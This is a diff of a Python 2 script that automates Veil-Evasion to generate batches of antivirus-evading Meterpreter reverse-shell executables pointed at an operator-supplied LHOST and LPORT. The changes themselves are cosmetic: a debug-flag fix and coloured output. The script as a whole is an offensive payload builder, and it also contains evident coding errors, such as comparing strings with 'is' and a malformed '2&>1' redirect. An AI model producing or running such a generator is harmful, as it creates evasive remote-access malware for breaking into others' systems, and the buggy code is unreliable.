@@ -10,17 +10,16 @@ import os
 import argparse
 
 veil_path = "/root/Veil-Evasion/Veil-Evasion.py"
+debug = False
 
 parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
 parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
 parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
 parser.add_argument('-o',metavar='path/to/payloads',type=dir,help='Directory to move all payloads\nDefault is: /home/<user>/payloads/')
-parser.add_argument('-d' ,metavar='T/F',type=bool,help='Display output or not')
+parser.add_argument('-d' ,metavar='T/F',type=str,help='Display output or not')
 args = parser.parse_args()
-if args.d.LowerCase() is 't':
+if args.d.lower() is 't':
     debug=True
-else:
-    debug=False
 payload_list={
               ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
               ("c/meterpreter/rev_http_service","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
@@ -72,10 +71,10 @@ for payload in payload_list:
         os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" 2&>1 >/dev/null") #silenced mode
     else:
         os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" > /dev/null") #silenced mode
-    print "\t[!] Payload: "+payload[0]+" created..." 
+    print "\033[93m\t[!] Payload: "+payload[0]+" created...\033[0m" 
 print "All payloads created without a single error :)\nLet me move them for you into: "+path
 os.system("mv /usr/share/veil-evasion/source/* "+path+".")
-print "\t[!]Source Codes Moved"
+print "\033[93m\t[!]Source Codes Moved\033[0m"
 os.system("mv /usr/share/veil-evasion/compiled/* "+path+".")
-print "\t[!]Payloads Moved"
-print "I'm done...\nHope to see you again on another test..."    
+print "\033[93m\t[!]Payloads Moved\033[0m"
+print "\033[92mI'm done...\nHope to see you again on another test...\033[0m"    
